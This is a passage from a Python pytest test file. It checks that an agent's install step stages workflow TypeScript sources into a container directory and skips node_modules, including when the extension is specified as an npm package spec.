    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", workflows_dir)
    await agent.install(environment)

    assert environment.staged_files == {"ferment-oneshot.workflow.ts", "ferment/contract.ts"}


async def test_install_stages_workflow_sources_for_npm_spec_too(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The workflow-sources upload (and its toolchain filtering) is entirely
    # independent of which extension form is in play — it must not regress
    # for npm: specs either.
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)
    workflows_dir = tmp_path / "workflows"
    workflows_dir.mkdir()
    (workflows_dir / "tb-solver.workflow.ts").write_text("export default {}\n")
    (workflows_dir / "node_modules").mkdir()
    (workflows_dir / "node_modules" / "junk.js").write_text("x\n")
    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", workflows_dir)

    class SnapshottingEnvironment(FakeEnvironment):
        def __init__(self) -> None:
            super().__init__()
            self.staged_files: set[str] = set()

        async def upload_dir(self, source_dir: Path | str, target_dir: str) -> None:
            await super().upload_dir(source_dir, target_dir)
            if target_dir == CONTAINER_WORKFLOWS_STAGE_DIR:
                root = Path(source_dir)
                self.staged_files = {p.relative_to(root).as_posix() for p in root.rglob("*") if p.is_file()}

    fake_extension_dir = tmp_path / "fake-npm-ext"
    fake_extension_dir.mkdir()
    agent = _agent(
        tmp_path,
        extension="npm:@kimchi-dev/kimchi-workflows@0.1.0",
        extension_resolver=lambda spec: ResolvedExtension(
            host_dir=fake_extension_dir, identity="unused", short_identity="unused"
        ),
    )
    environment = SnapshottingEnvironment()

    await agent.install(environment)

    assert environment.staged_files == {"tb-solver.workflow.ts"}
